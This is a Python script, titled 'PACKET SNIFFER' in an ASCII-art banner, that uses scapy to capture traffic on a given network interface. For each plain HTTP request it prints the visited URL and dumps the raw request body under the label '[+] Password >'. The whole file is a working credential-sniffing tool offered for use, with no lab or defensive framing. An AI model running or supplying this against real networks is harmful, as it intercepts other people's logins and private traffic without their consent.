import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="interface", help="Interface of the network (ex: enO / ethO)")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[!] Please add an interface to proceed, --help for more informations.")
    return options

def sniffer(interface):
    scapy.sniff(iface = interface, store = False, prn = sniffed_packet)
print("""
 ______   ______     ______     __  __     ______     ______      ______     __   __     __     ______   ______   ______     ______    
/\  == \ /\  __ \   /\  ___\   /\ \/ /    /\  ___\   /\__  _\    /\  ___\   /\ "-.\ \   /\ \   /\  ___\ /\  ___\ /\  ___\   /\  == \   
\ \  _-/ \ \  __ \  \ \ \____  \ \  _"-.  \ \  __\   \/_/\ \/    \ \___  \  \ \ \-.  \  \ \ \  \ \  __\ \ \  __\ \ \  __\   \ \  __<   
 \ \_\    \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\    \ \_\     \/\_____\  \ \_\\"\_\  \ \_\  \ \_\    \ \_\    \ \_____\  \ \_\ \_\ 
  \/_/     \/_/\/_/   \/_____/   \/_/\/_/   \/_____/     \/_/      \/_____/   \/_/ \/_/   \/_/   \/_/     \/_/     \/_____/   \/_/ /_/    
  
  [+] Waiting for traffic..                                                                                                                              
""")
def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] URL > " + url)
        if packet.haslayer(scapy.Raw):
            print("[+] Password > " + str(packet[scapy.Raw].load))

options = get_arguments()
sniffer(options.interface)
